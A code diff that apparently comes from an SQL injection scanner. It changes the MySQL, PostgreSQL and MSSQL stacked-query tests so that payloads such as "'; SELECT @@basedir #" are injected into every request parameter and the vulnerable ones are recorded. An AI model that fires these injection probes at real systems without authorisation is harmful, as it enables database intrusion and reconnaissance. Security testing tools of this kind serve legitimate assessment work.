@@ -33,6 +33,9 @@ class StackedQueriesInjector:
         """Test for MySQL stacked queries SQL injection."""
         results = []
         
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
+        
         # Common MySQL stacked queries payloads
         payloads = [
             "'; SELECT 1 --",
@@ -53,29 +56,35 @@ class StackedQueriesInjector:
             "'; SELECT @@basedir #"
         ]
         
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_mysql_stacked_success(response):
-                    results.append({
-                        "type": "mysql_stacked_queries",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "data": self._extract_mysql_stacked_data(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing MySQL stacked queries: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_mysql_stacked_success(response):
+                        results.append({
+                            "type": "stacked",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "data": self._extract_mysql_stacked_data(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing MySQL stacked queries: {str(e)}")
+                    continue
+                    
         return results
         
     def _test_postgres_stacked(self) -> List[Dict[str, Any]]:
         """Test for PostgreSQL stacked queries SQL injection."""
         results = []
+        
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
         
         # Common PostgreSQL stacked queries payloads
         payloads = [
@@ -95,29 +104,35 @@ class StackedQueriesInjector:
             "'; SELECT inet_server_port() #"
         ]
         
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_postgres_stacked_success(response):
-                    results.append({
-                        "type": "postgres_stacked_queries",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "data": self._extract_postgres_stacked_data(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing PostgreSQL stacked queries: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_postgres_stacked_success(response):
+                        results.append({
+                            "type": "stacked",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "data": self._extract_postgres_stacked_data(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing PostgreSQL stacked queries: {str(e)}")
+                    continue
+                    
         return results
         
     def _test_mssql_stacked(self) -> List[Dict[str, Any]]:
         """Test for MSSQL stacked queries SQL injection."""
         results = []
+        
+        # Get all parameters from the request
+        params = self.request_engine.get_parameters()
         
         # Common MSSQL stacked queries payloads
         payloads = [
@@ -137,24 +152,27 @@ class StackedQueriesInjector:
             "'; SELECT @@spid #"
         ]
         
-        for payload in payloads:
-            try:
-                # Send request with payload
-                response, _ = self.request_engine.send_request(payload=payload)
-                
-                # Check if response indicates successful injection
-                if self._check_mssql_stacked_success(response):
-                    results.append({
-                        "type": "mssql_stacked_queries",
-                        "payload": payload,
-                        "status": "vulnerable",
-                        "data": self._extract_mssql_stacked_data(response)
-                    })
+        for param_name, param_value in params.items():
+            for payload in payloads:
+                try:
+                    # Send request with payload
+                    test_value = param_value + payload if param_value else payload
+                    response, _ = self.request_engine.send_request(params={param_name: test_value})
                     
-            except Exception as e:
-                logging.error(f"Error testing MSSQL stacked queries: {str(e)}")
-                continue
-                
+                    # Check if response indicates successful injection
+                    if self._check_mssql_stacked_success(response):
+                        results.append({
+                            "type": "stacked",
+                            "parameter": param_name,
+                            "payload": payload,
+                            "status": "vulnerable",
+                            "data": self._extract_mssql_stacked_data(response)
+                        })
+                        
+                except Exception as e:
+                    logging.error(f"Error testing MSSQL stacked queries: {str(e)}")
+                    continue
+                    
         return results
         
     def _check_mysql_stacked_success(self, response) -> bool:
